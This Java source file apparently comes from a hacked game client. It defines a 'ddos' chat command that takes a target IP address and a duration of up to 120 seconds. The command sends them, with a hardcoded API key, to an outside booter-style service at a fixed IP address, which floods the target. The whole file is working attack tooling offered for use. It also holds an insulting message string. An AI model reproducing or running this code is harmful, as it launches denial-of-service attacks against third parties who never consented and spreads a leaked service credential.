package saint.comandstuff.commands;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import saint.comandstuff.Command;
import saint.utilities.Logger;

public class Ddos extends Command {
   public Ddos() {
      super("ddos", "<ip-address time>", "dos", "hitoff");
   }

   public void run(String message) {
      String address = message.split(" ")[1];
      int time = Integer.parseInt(message.split(" ")[2]);
      if (time > 120) {
         Logger.writeChat("Maximum time allowed is 120!");
      } else if (time < 1) {
         Logger.writeChat("Are you retarded?");
      } else {
         try {
            URL url = new URL("http://52.6.120.123/info.php?key=MgsBdytXnJQ9RbO&ip=" + address + "&port=80&time=" + time);
            HttpURLConnection connection = (HttpURLConnection)url.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0");
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(5000);
            connection.connect();
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line = reader.readLine();
            Logger.writeChat("API Response: " + line);
         } catch (MalformedURLException var8) {
            Logger.writeChat("Unknown error..");
            var8.printStackTrace();
         } catch (IOException var9) {
            Logger.writeChat("Unknown error..");
            var9.printStackTrace();
         }

      }
   }
}
